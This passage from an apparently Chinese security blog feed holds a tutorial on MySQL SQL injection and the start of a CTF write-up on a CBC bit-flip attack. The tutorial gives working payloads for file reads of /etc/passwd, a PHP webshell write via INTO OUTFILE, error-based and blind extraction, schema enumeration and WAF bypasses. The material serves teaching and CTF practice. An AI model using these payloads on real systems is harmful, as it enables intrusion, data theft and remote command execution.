OUTFILE</p><p>如果该变量为NULL就不可使用了。</p><p>在mysql&lt;5.5.53之前的版本可以使用</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520084658959.png" class title="image-20210520084658959"><p>可以看到我的mysql版本是不能使用的。</p><p>读文件方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读文件函数LOAD_FILE()</span><br><span class="line">SELECT LOAD_FILE(&#39;&#x2F;flag&#39;);</span><br><span class="line">SELECT LOAD_FILE(0x2F6574632F706173737764);</span><br></pre></td></tr></table></figure><p>注：LOAD_FILE默认目录为datadir</p><p>文件须有可读权限</p><p>读取文件最大字节保存在max_allowed_packet变量中</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520084903094.png" class title="image-20210520084903094"><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INTO OUTFILE&#x2F;DUMPFILE</span><br><span class="line">SELECT &#39;&lt;? system($_GET[&#39;c&#39;]); ?&gt;&#39; INTO OUTFILE &#39;&#x2F;var&#x2F;www&#x2F;shell.php&#39;;</span><br><span class="line"></span><br><span class="line">这两个函数都可以写文件，但是有很大的差别 </span><br><span class="line"></span><br><span class="line">INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符 </span><br><span class="line">INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择 </span><br></pre></td></tr></table></figure><p><strong>正则绕过</strong></p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520085325116.png" class title="image-20210520085325116"><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520085341459.png" class title="image-20210520085341459"><h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h6 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a>floor报错</h6><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(0x3a,version(),0x3a,floor(rand(0)*2))a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure><p>floor报错关键在于count(),floor(),rand().其中floor(rand(0)<em>2)是报错的关键，因为count()会创建一个虚拟表，而floor(rand(0)\</em>2)的值是0，多次查询后值仍然是0，无法被聚合到count(*)中，所以引发报错,0x3a在这里是”:”。</p><h6 id="UpdateXml报错注入"><a href="#UpdateXml报错注入" class="headerlink" title="UpdateXml报错注入"></a>UpdateXml报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(0,concat(0x7e,(select database())),0);</span><br></pre></td></tr></table></figure><p>updatexml函数的作用是改变文档个节点中的值。</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p><p>这里报错的原理是使用concat讲updatexml第二个参数链接为一个字符串，使其不符合xmlstring格式的字符串，这里的0x7e是”<del>“,xpath格式不允许</del>开头，所以会爆出数据。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520092447571.png" class title="image-20210520092447571"><h6 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1,concat(0x7e,(select database())));</span><br></pre></td></tr></table></figure><p>extractvalue()：从目标XML中返回包含所查询值的字符串。</p><p>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)</p><p>原理和UpdateXml类似，一样的是使用concat使得字符串不符合xpath格式，从而报错。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520092857850.png" class title="image-20210520092857850"><h2 id="使用元数据库查询爆表名"><a href="#使用元数据库查询爆表名" class="headerlink" title="使用元数据库查询爆表名"></a>使用元数据库查询爆表名</h2><h6 id="数据库：information-schema"><a href="#数据库：information-schema" class="headerlink" title="数据库：information_schema"></a>数据库：information_schema</h6><p>根据以上任意一个注入方法便可以进行注入了，只需要在回显出的语句换成我们的爆表名语句即可、</p><p>informaion_schema这个数据库里面SCHEMATA表保存了mysql里面存的所有数据库。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520172853744.png" class title="image-20210520172853744"><p>TABLES表保存了所有表名以及每个表所对应的数据库，下面是TABLES表的表结构。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520173525391.png" class title="image-20210520173525391"><p>TABLE_SCHEMA是数据库名，TABLE_NAME为表名。</p><p>所以查询user表中的所有表，就应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA &#x3D; &#39;user&#39;;</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520173747351.png" class title="image-20210520173747351"><h6 id="数据库：sys"><a href="#数据库：sys" class="headerlink" title="数据库：sys"></a>数据库：sys</h6><p>在MYSQL5.7的版本中，sys数据库里保存了很多信息。其中statement_analysis表中的query字段保存了执行过的sql语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select query from sys.statement_analysis;</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520224916803.png" class title="image-20210520224916803"><p>我们还可以通过查询sys数据库中的视图来爆出库的所有表名。</p><p>常用视图有:</p><p>sys.schema_table_statistics_with_buffer</p><p>sys.x$schema_table_statistics_with_buffer</p><p>sys.x$schema_table_statistics</p><p>sys.x$ps_schema_table_statistics_io</p><p>视图可以爆出表明，因为以上视图都拥有如下相似结构，他们都拥有table_schema字段和table_name字段，这两个字段可以直接查询出当前数据库中的所有表名。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520230638027.png" class title="image-20210520230638027"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select table_name from &#39;视图&#39; where table_schema&#x3D;&#39;数据库名&#39;;</span><br><span class="line">eg：</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema&#x3D;&#39;luntan&#39;;</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520230817268.png" class title="image-20210520230817268"><h6 id="数据库mysql"><a href="#数据库mysql" class="headerlink" title="数据库mysql"></a>数据库mysql</h6><p>mysql默认存储引擎innoDB携带的表也保存了一些数据库和表名的关系</p><p>mysql.innodb_table_stats</p><p>mysql.innodb_index_stats</p><p>这两个表均含有database_name和table_name字段：</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210520231539760.png" class title="image-20210520231539760"><p>构造查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select table_name from &#39;目标表&#39; where database_name&#x3D;&#39;数据库名&#39;</span><br><span class="line">select database_name,table_name from mysql.innodb_index_stats where database_name&#x3D;&#39;invite_code&#39;;</span><br></pre></td></tr></table></figure><h2 id="bool盲注："><a href="#bool盲注：" class="headerlink" title="bool盲注："></a>bool盲注：</h2><p>来分析以下这样一个sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where id &#x3D; &#39;1&#39; and ascii(substr((SELECT database()),1,1)) &#x3D; 120;</span><br><span class="line">拆解如下：</span><br><span class="line">SELECT * FROM users where id &#x3D; &#39;1&#39; and</span><br><span class="line">ascii()</span><br><span class="line">substr(select database,1,1)</span><br><span class="line">要求：查询语句成立时与不成立时页面不同。</span><br><span class="line">ascii()返回字符的ascii码</span><br><span class="line">substr()按照参数截取字符串</span><br><span class="line">这里就很明显能看出来了，and左边是成立的，现在只要根据页面的变化就可以判断and右边是返回真还是返回假。</span><br><span class="line">ascii(substr((SELECT database()),1,1))取到数据库名的第一位字符，将他与一个ascii字符编码进行比较，若成立可以返回真。可以据此规律来进行爆破求出第一位字符的ascii码。以此类推。</span><br></pre></td></tr></table></figure><p>多行数据需要使用group_concat进行聚合为一行不然无法显示。</p><h2 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h2><p>时间盲注用到的函数和bool盲注类似，但是bool盲注是通过查询语句返回真or假进而导致页面显示不同的获取信息。而时间盲注是通过一些延时函数通过页面请求时间来判断sql语句执行成功或失败的。</p><h6 id="常见延时方法："><a href="#常见延时方法：" class="headerlink" title="常见延时方法："></a>常见延时方法：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep(1):延时1秒</span><br><span class="line">benchmark(1000,select * from admin):通过增加查询次数来增大计算量达到延迟</span><br><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B;通过计算笛卡尔积来打到延时效果</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and if(ascii(substr((SELECT database()),1,1)) &gt; 1,sleep(2),1)--+</span><br></pre></td></tr></table></figure><p>利用此可以进行盲注</p><h2 id="无列名注数据"><a href="#无列名注数据" class="headerlink" title="无列名注数据"></a>无列名注数据</h2><h6 id="sql语句分析："><a href="#sql语句分析：" class="headerlink" title="sql语句分析："></a>sql语句分析：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 union select * from user;</span><br></pre></td></tr></table></figure><p>此时我的user表里面有5个字段，我现在不知道他的列名，但可以构造列名进行显示。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210521142927657.png" class title="image-20210521142927657"><p>可以看到现在我们查询出来的表，列名变成了1，2，3，4，5。绕过了列名进行注入。</p><h6 id="取出数据"><a href="#取出数据" class="headerlink" title="取出数据"></a>取出数据</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#96;1&#96; from (select 1,2,3,4,5 union select * from user) as a1</span><br><span class="line">这里的1就是我们新的表字段1的数据。</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210521143230393.png" class title="image-20210521143230393"><p>聚合以方便查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(&#96;1&#96;) from (select 1,2,3,4,5 union select * from user) as a1</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210521143505617.png" class title="image-20210521143505617"><h2 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h2><h6 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h6><p>16进制绕过，绕过前:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;Admin&quot;;</span><br></pre></td></tr></table></figure><p>假如WAF拦截了Admin,我们可以将Admin换为他对应的16进制进行绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; 0x41646D696E;</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210521235504081.png" class title="image-20210521235504081"><p>注：此方法不可绕过字段名，只能在where后面使用</p><p>url二次编码</p><p>url二次编码需要后端urldecode()函数进行url解码,如下图片很好的展示了这个过程。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210522010257415.png" class title="image-20210522010257415"><h6 id="lt-gt-绕过"><a href="#lt-gt-绕过" class="headerlink" title="&lt;&gt;绕过"></a>&lt;&gt;绕过</h6><p>需要网页后端过滤了&lt;&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uni&lt;&gt;on sel&lt;&gt;ect</span><br></pre></td></tr></table></figure><h6 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uni&#x2F;**&#x2F;on se&#x2F;**&#x2F;lect</span><br></pre></td></tr></table></figure><h6 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;</span><br><span class="line">%20 %09 %00</span><br><span class="line">()</span><br><span class="line">回车(url编码中的%0a)</span><br><span class="line">&#96;(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><h6 id="绕过or-and"><a href="#绕过or-and" class="headerlink" title="绕过or/and"></a>绕过or/and</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and &#x3D; &amp;&amp;</span><br><span class="line">or &#x3D; ||</span><br></pre></td></tr></table></figure><h6 id="等号-绕过"><a href="#等号-绕过" class="headerlink" title="等号=绕过"></a>等号=绕过</h6><p>=可以等于like，可以使用like来绕过；1 or 1 like 1</p><p>rlike和like类似；1 or 1 rlike 1</p><p>regexp：执行正则表达式匹配；1 or 1 regexp 1</p><p>&lt;&gt;等价于!=，那么在&lt;&gt;前面加个!再次取反就是=了 1 or 1 !(&lt;&gt;)1</p><h6 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h6><p>过滤单引号时，宽字符绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%bf%27  %df%27  %aa%27</span><br></pre></td></tr></table></figure><p>也可以使用16进制绕过，进行查询时16进制不需要使用单引号引起来</p><h6 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h6><p>在盲注中常使用substr(“string”,1,3)来截取字符串,那么当,被过滤的时候，可以使用substr(“string” from 1 for 3);</p><p>offset关键字：</p><p>offset关键字用于绕过limit中使用的,</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210522014402933.png" class title="image-20210522014402933"><p>这两行代码是等价的</p><p>select * from user limit 3 offt 0; 等价于 select * from user limit 0,3;</p><h2 id="利用join无列名注入，爆列名。"><a href="#利用join无列名注入，爆列名。" class="headerlink" title="利用join无列名注入，爆列名。"></a>利用join无列名注入，爆列名。</h2><p>爆列名：基本payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id &#x3D; 1 union select * from(select * from user as a join user as b)as c #爆出第一个列名</span><br><span class="line">select * from user where id &#x3D; 1 union select * from(select * from user as a join user as b using(&#39;列名1&#39;))as c #爆出第二个列名</span><br><span class="line">select * from user where id &#x3D; 1 union select * from(select * from user as a join user as b using(&#39;列名1&#39;,&#39;列名2&#39;))as c #爆出第三个列名</span><br><span class="line">循环往复直到爆出所有。</span><br></pre></td></tr></table></figure><p>payload分解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user as a join user as b</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210522102824037.png" class title="image-20210522102824037"><p>这个吧一个了两个user表合起来成为了一个user表，取别名的作用是表名时不能重复的，不然会触发报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from user as a join user as b)as c</span><br></pre></td></tr></table></figure><p>前面我们已经将两个表和在一起了，现在在进行查询的时候会因为表中存在相同列名而报错从而爆出列名。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210522103206847.png" class title="image-20210522103206847"><p>这个时候我们用上using字段忽略重复列名，而未被忽略的就是第二列的列名。轮回往复爆出所有列名。</p><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210522103337387.png" class title="image-20210522103337387"><h2 id="regexp正则盲注"><a href="#regexp正则盲注" class="headerlink" title="regexp正则盲注"></a>regexp正则盲注</h2><p>所有的盲注无一例外都离不开”猜”，bool盲注靠比较运算符是否成立来猜，时间盲注靠是否延时来猜，而regexp盲注则靠regexp匹配是否成功来猜。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username regexp BINARY &quot;^A&quot;;</span><br><span class="line">获取username为大写A开头的行，BINARY字段对大小写敏感，在mysql中regexp默认是对大小写不敏感的。</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210524104032469.png" class title="image-20210524104032469"><p>有了这个理论基础，就可以通过轮回爆破用户名密码，但是前提是得知道用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;admin&#39; or passwd regexp BINARY &quot;^A&quot;;</span><br><span class="line">这里的passwd是对应的password字段名，简单分析可根据次sql语句满足或者不满足判断导致的web页面变化来爆破密码。</span><br></pre></td></tr></table></figure><img src="/2021/05/19/%E5%B8%B8%E8%A7%81SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20210524104653546.png" class title="image-20210524104653546"><h6 id="REGEXP可以通过组合绕过各种过滤"><a href="#REGEXP可以通过组合绕过各种过滤" class="headerlink" title="REGEXP可以通过组合绕过各种过滤"></a>REGEXP可以通过组合绕过各种过滤</h6><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;admin&#39; or passwd regexp BINARY &quot;^A&quot;;</span><br><span class="line">由于核心payload为or passwd regexp BINARY &quot;^A&quot;</span><br><span class="line">针对此进行常见绕过</span><br><span class="line">or:||</span><br><span class="line">空格:&#x2F;**&#x2F;</span><br><span class="line">&quot;^A&quot;16进制绕过引号：0X5E41</span><br><span class="line">绕过后:</span><br><span class="line">||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;BINARY&#x2F;**&#x2F;0X5E41;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;sql常见运算符，注释符。&quot;&gt;&lt;a href=&quot;#sql常见运算符，注释符。&quot; class=&quot;headerlink&quot; title=&quot;sql常见运算符，注释符。&quot;&gt;&lt;/a&gt;sql常见运算符，注释符。&lt;/h2&gt;&lt;p&gt;众所周知sql存在注入的本</summary>
      
    
    
    
    
    <category term="-SQL注入 -web安全" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5-web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>记一次一血，CBC字节翻转攻击/bmp隐写</title>
    <link href="http://example.com/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/"/>
    <id>http://example.com/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/</id>
    <published>2021-05-19T02:30:23.000Z</published>
    <updated>2021-05-22T02:38:39.039Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ISCC客服一号冲冲冲（二）"><a href="#ISCC客服一号冲冲冲（二）" class="headerlink" title="ISCC客服一号冲冲冲（二）"></a>ISCC客服一号冲冲冲（二）</h3><p>考点：CBC字节翻转攻击，bmp隐写</p><p>进入题目发现就给了一张图片，扫目录，看返回包，没有发现有用信息。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518143502645.png" class title="image-20210518143502645"><p>发现图片是个登录框，联想到手动传参登录。尝试get，post最后发现post可以成功发送登录请求，根据题目提示，账户为admin，密码为上一道题的flag：‘1SCC_2o2l_KeFuu’，我这里没用是因为只是为了掩饰，真正打的时候密码得用1SCC_2o2l_KeFuu，然后提示admin账户无法登录。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518144021047.png" class title="image-20210518144021047"><p>更换账户尝试，发现响应头中含有iv，cipher。属于CBC字节翻转攻击标志。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/6%5D%5DYZPIHGM%7B%5BXL%7D0R28CA.png" class title="img"><p>现在需要后端的加密源码，尝试寻找源码泄露途径。发现登陆的哪个图片是bmp格式的，bmp存在隐写。下载下来使用工具发现源码就藏在其中，红色部分为泄露的源码。</p><img src="/2021/05/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%80%E8%A1%80%EF%BC%8CCBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-bmp%E9%9A%90%E5%86%99/image-20210518144552493.png" class title="image-20210518144552493"><p>因为这个隐写只找出了这么点代码，就通过源码特征在网上搜到了全部源码。</p><p>整理后如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span 